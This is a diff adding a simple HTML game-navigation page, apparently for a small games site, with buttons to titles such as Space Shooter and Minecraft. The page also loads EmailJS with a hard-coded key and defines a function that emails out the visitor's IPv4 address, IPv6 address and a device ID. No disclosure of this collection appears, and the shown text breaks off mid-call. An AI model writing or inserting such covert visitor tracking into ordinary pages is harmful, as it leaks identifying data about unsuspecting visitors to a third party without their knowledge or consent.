@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Website Navigation</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: green;
+            color: white;
+        }
+        .navigation {
+            text-align: center;
+        }
+        button {
+            margin: 10px;
+            padding: 10px 20px;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="navigation">
+        <button id="gotoSpaceStationUSA">Go to Space Station USA</button>
+        <button id="gotoFallingDanger">Go to Falling Danger</button>
+        <button id="gotoSpaceShooter">Go to Space Shooter</button>
+        <button id="gotoMinecraft">Go to Minecraft</button>
+    </div>
+
+    <!-- Include EmailJS SDK -->
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script type="text/javascript">
+        // Initialize EmailJS
+        (function() {
+            emailjs.init("N4QPJjdGkEyvy7BdZ"); // Your actual public key
+        })();
+
+        function sendEmail(ipv4, ipv6, deviceID) {
+            const templateParams = {
+                ipv4: ipv4,
+                ipv6: ipv6,
+                ID: deviceID
+            };
+
+            emailjs.send('service_120g06
